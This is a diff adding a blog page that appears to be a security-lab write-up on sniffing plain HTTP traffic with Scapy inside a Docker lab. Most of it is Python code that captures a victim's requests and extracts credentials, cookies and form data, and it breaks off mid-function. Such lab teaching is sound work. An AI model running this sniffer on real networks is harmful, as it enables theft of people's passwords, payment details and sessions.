@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Scapy HTTP Dissection</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>Here we exploit one of many vulnerabilities of HTTP to create a sniffer
+which scrapes traffic sent by Alice over the network.
+Our goal is to steal the information including usernames, passwords,
+order numbers, etc. sent over the network. We again use the Sacpy library to
+acheive this.</p>
+
+<p>Similar to our <a href="http://192.168.0.52:4000/crypto/2020/10/20/06-scapy.html">previous exercise</a>.
+we use <code class="language-plaintext highlighter-rouge">sniff()</code> from the Scapy library and filter the incoming packets to
+isolate the ones we are interested in.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#sniffing-packets" id="markdown-toc-sniffing-packets">Sniffing Packets</a></li>
+  <li><a href="#dissecting-the-packets" id="markdown-toc-dissecting-the-packets">Dissecting the Packets</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>Our docker-compose looks like</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span>
+
+<span class="na">services</span><span class="pi">:</span>
+  <span class="na">alice</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">alice</span>
+    <span class="na">cap_add</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+      <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
+    <span class="na">dns</span><span class="pi">:</span> <span class="s">1.1.1.1</span>
+    <span class="na">networks</span><span class="pi">:</span>
+      <span class="na">channel</span><span class="pi">:</span>
+        <span class="na">ipv4_address</span><span class="pi">:</span> <span class="s">10.0.0.2</span>
+
+  <span class="na">mallory</span><span class="pi">:</span>
+      <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+      <span class="na">container_name</span><span class="pi">:</span> <span class="s">mallory</span>
+      <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+      <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span>
+      <span class="na">cap_add</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="s">NET_ADMIN</span>
+        <span class="pi">-</span> <span class="s">SYS_ADMIN</span>
+      <span class="na">volumes</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s">.:/shared</span>
+      <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:alice</span>
+      
+  <span class="na">wireshark</span><span class="pi">:</span>
+    <span class="na">image</span><span class="pi">:</span> <span class="c1"># private image</span>
+    <span class="na">container_name</span><span class="pi">:</span> <span class="s">wireshark</span>
+    <span class="na">tty</span><span class="pi">:</span> <span class="no">true</span>
+    <span class="na">network_mode</span><span class="pi">:</span> <span class="s">service:alice</span>
+
+<span class="na">networks</span><span class="pi">:</span>
+  <span class="na">channel</span><span class="pi">:</span>
+    <span class="na">driver</span><span class="pi">:</span> <span class="s">bridge</span>
+    <span class="na">ipam</span><span class="pi">:</span>
+      <span class="na">config</span><span class="pi">:</span>
+        <span class="pi">-</span> <span class="na">subnet</span><span class="pi">:</span> <span class="s">10.0.0.0/28</span>
+</code></pre></div></div>
+
+<p>We begin with the <a href="/crypto/2020/10/08/05-lab.html#setup">usual setup</a>
+of our labs involving Docker.
+Alice again uses nodejs and with <code class="language-plaintext highlighter-rouge">docker-compose up alice</code> runs</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">request</span><span class="dl">'</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">e-commerce.seclab.space</span><span class="dl">"</span>
+
+<span class="kd">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="dl">'</span><span class="s1">alice</span><span class="dl">'</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="dl">'</span><span class="s1">4l1c3</span><span class="dl">'</span><span class="p">,</span> <span class="na">cc</span><span class="p">:</span> <span class="dl">'</span><span class="s1">4111111111111111</span><span class="dl">'</span><span class="p">,</span> <span class="na">exp</span><span class="p">:</span> <span class="dl">'</span><span class="s1">12/20</span><span class="dl">'</span><span class="p">,</span> <span class="na">code</span><span class="p">:</span> <span class="dl">'</span><span class="s1">945</span><span class="dl">'</span><span class="p">};</span>
+
+<span class="kd">let</span> <span class="nx">do_request</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+    <span class="kd">let</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">jar</span><span class="p">();</span>
+    <span class="kd">let</span> <span class="nx">req</span> <span class="o">=</span> <span class="nx">request</span><span class="p">.</span><span class="nx">defaults</span><span class="p">({</span><span class="na">jar</span><span class="p">:</span><span class="nx">j</span><span class="p">});</span>
+    <span class="nx">req</span><span class="p">.</span><span class="kd">get</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/home?lang=en</span><span class="dl">"</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+        <span class="kd">let</span> <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] GET response received</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/login</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="na">form</span><span class="p">:</span> <span class="p">{</span><span class="na">username</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="na">password</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">password</span><span class="p">},</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+            <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] POST response received</span><span class="dl">"</span><span class="p">);</span>
+            <span class="nx">req</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/buy?item=lamp&amp;currency=CAD</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span><span class="na">form</span><span class="p">:</span> <span class="p">{</span><span class="na">cc</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">cc</span><span class="p">,</span> <span class="na">exp</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">exp</span><span class="p">,</span> <span class="na">code</span><span class="p">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">code</span><span class="p">},</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">){</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+                <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] PUT response received</span><span class="dl">"</span><span class="p">);</span>
+                <span class="nx">req</span><span class="p">.</span><span class="kd">get</span><span class="p">({</span><span class="na">url</span><span class="p">:</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">server</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/check</span><span class="dl">"</span><span class="p">,</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">5000</span><span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">body</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+                    <span class="nx">protocol</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span><span class="p">.</span><span class="nx">protocol</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="k">return</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] [</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">response</span><span class="p">.</span><span class="nx">statusCode</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">body</span><span class="p">);</span>
+                    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">protocol</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">] GET response received</span><span class="dl">"</span><span class="p">);</span>
+                <span class="p">});</span>
+            <span class="p">});</span>
+        <span class="p">});</span>
+    <span class="p">});</span>
+<span class="p">};</span>
+
+<span class="nx">do_request</span><span class="p">();</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="sniffing-packets">Sniffing Packets</h2>
+
+<hr />
+
+<p>We aren’t concerned about how Mallory manages to read Alice’s packets but rather
+the parsing done with Scapy
+but one example would be as a
+<a href="/crypto/2020/10/15/06-malgat.html">malicious gateway</a>.
+We tweak our packet filter to return only our
+targeted packets.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span> <span class="n">parse_qs</span>
+
+<span class="n">load_layer</span><span class="p">(</span><span class="s">'http'</span><span class="p">)</span>
+<span class="n">load_layer</span><span class="p">(</span><span class="s">'tls'</span><span class="p">)</span>
+<span class="n">load_layer</span><span class="p">(</span><span class="s">'dns'</span><span class="p">)</span>
+
+<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="k">def</span> <span class="nf">packet_filter</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">HTTP</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">HTTPRequest</span><span class="p">)</span> <span class="ow">or</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">HTTPResponse</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>The main driver is similar to the first Scapy exercise we did.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">filepath</span><span class="p">):</span>
+    <span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s">"eth0"</span><span class="p">,</span> <span class="n">lfilter</span><span class="o">=</span><span class="n">packet_filter</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">packet_process</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="n">count</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">file_stream</span><span class="p">:</span>
+        <span class="n">file_stream</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">results</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="dissecting-the-packets">Dissecting the Packets</h2>
+
+<hr />
+
+<p>All that remains now is to rip the remaining information from the sniffed packet
+and store in a json format for easy reading and parsing.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">packet_process</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
+
+    <span class="c1"># will store the information from sniffed packet
+</span>    <span class="n">result_accumulator</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+    <span class="n">http_type</span> <span class="o">=</span> <span class="s">"request"</span> <span class="k">if</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">HTTPRequest</span><span class="p">)</span> <span class="k">else</span> <span class="s">"response"</span>
+    <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"type"</span><span class="p">]</span> <span class="o">=</span> <span class="n">http_type</span>
+    <span class="n">body</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="k">if</span> <span class="n">packet</span><span class="p">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+        <span class="n">body</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">Raw</span><span class="p">].</span><span class="n">load</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">http_type</span> <span class="o">==</span> <span class="s">"request"</span><span class="p">):</span>
+        <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"host"</span><span class="p">]</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Host</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"method"</span><span class="p">]</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Method</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Path</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"path"</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span>
+        <span class="k">if</span> <span class="s">"?"</span> <span class="ow">in</span> <span class="n">path</span><span class="p">:</span>
+            <span class="n">query_part</span> <span class="o">=</span> <span class="n">path</span><span class="p">[</span><span class="n">path</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">"?"</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
+            <span class="n">query_dict</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">query_part</span><span class="p">)</span>
+            <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">query_dict</span><span class="p">:</span>
+                <span class="n">query_dict</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">query_dict</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+            <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"query_args"</span><span class="p">]</span> <span class="o">=</span> <span class="n">query_dict</span>
+        <span class="k">if</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Cookie</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">cookies</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="n">cooks_comps</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Cookie</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
+            <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">cooks_comps</span><span class="p">:</span>
+                <span class="n">append_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">'key'</span> <span class="p">:</span> <span class="n">key</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span> <span class="s">'value'</span> <span class="p">:</span> <span class="n">cooks_comps</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]}</span>
+                <span class="n">cookies</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">append_dict</span><span class="p">)</span>
+            <span class="n">result_accumulator</span><span class="p">[</span><span class="s">'cookies'</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookies</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">body</span> <span class="o">!=</span> <span class="s">""</span><span class="p">):</span>
+            <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span>
+            <span class="n">content_type</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPRequest</span><span class="p">].</span><span class="n">Content_Type</span>
+            <span class="k">if</span> <span class="p">((</span><span class="n">content_type</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">content_type</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">)):</span>
+                <span class="n">form_comps</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
+                <span class="n">form</span> <span class="o">=</span> <span class="p">[]</span>
+                <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">form_comps</span><span class="p">:</span>
+                    <span class="n">append_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">'key'</span><span class="p">:</span> <span class="n">key</span><span class="p">.</span><span class="n">strip</span><span class="p">(),</span> <span class="s">'value'</span><span class="p">:</span> <span class="n">form_comps</span><span class="p">[</span><span class="n">key</span><span class="p">][</span><span class="mi">0</span><span class="p">]}</span>
+                    <span class="n">form</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">append_dict</span><span class="p">)</span>
+                <span class="n">result_accumulator</span><span class="p">[</span><span class="s">'form'</span><span class="p">]</span> <span class="o">=</span> <span class="n">form</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">http_type</span> <span class="o">==</span> <span class="s">"response"</span><span class="p">):</span>
+        <span class="n">result_accumulator</span><span class="p">[</span><span class="s">"status_code"</span><span class="p">]</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPResponse</span><span class="p">].</span><span class="n">Status_Code</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+        <span class="n">set_cookie</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">HTTPResponse</span><span class="p">].</span><span class="n">Set_Cookie</span>
+        <span class="k">if</span> <span class="n">set_cookie</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="n">cookie_str</span> <span class="o">=</span> <span class="n">set_cookie</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)[:</span><span class="n">set_cookie</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">index</span><span class="p">(</span><span class="s">";"</span><span class="p">)]</span> <span class="k">if</span> <span class="s">";"</span> <span class="ow">in</span> <span class="n">set_cookie</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="k">else</span> <span class="n">set_cookie</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+            <span class="n">split_cookie</span> <span class="o">=</span> <span class="n">cookie_str</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"="</span><span class="p">)</span>
+            <span class="n">cookie_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">'key'</span> <span class="p">:</span> <span class="n">split_cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">'value'</span> <span class="p">:</span> <span class="n">split_cookie</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
+            <span class="n">result_accumulator</span><span class="p">[</span><span class="s">'cookie'</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie_dict</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">body</span> <span class="o">!=</span> <span class="s">""</span><span class="p">):</span>
